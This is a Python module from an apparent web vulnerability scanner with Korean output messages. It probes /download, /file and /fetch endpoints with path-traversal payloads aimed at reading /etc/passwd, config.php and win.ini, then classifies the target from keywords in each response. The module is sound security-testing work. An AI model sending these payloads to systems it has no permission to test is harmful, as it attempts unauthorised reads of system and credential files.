# modules/path_traversal.py
# -*- coding: utf-8 -*-
import time
from typing import Dict, Any

def test_path_traversal(target: str, session) -> Dict[str, Any]:
    paths = ['/download', '/file', '/fetch']
    payloads = ['../../../../etc/passwd', '../config.php', '..\\..\\windows\\win.ini']
    details = []
    vuln = False

    for p in paths:
        url = target.rstrip('/') + p
        for pl in payloads:
            try:
                r = session.get(url, params={'file':pl}, timeout=6)
                text = (r.text or "").lower()
                if 'root:' in text or 'pass' in text or 'php' in text and r.status_code==200:
                    vuln = True
                    details.append(f"[의심] {url} param=file={pl} 에서 응답에 민감 키워드 발견")
                # 오류 메시지로 path 관련 노출 확인
                if 'open failed' in text or 'no such file or directory' in text:
                    details.append(f"[에러노출] {url} file={pl} -> 서버 에러 메시지 노출")
            except Exception as e:
                details.append(f"[요청오류] {url} file={pl} 요청 실패: {e}")
            time.sleep(0.3)
    if vuln:
        return {'status':'취약','description':'경로 추적으로 민감 정보 노출 가능성','details':details}
    if details:
        return {'status':'인터뷰','description':'경로 추적 검사 중 의심 항목 존재','details':details}
    return {'status':'양호','description':'경로 추적 의심 미발견','details':[]}
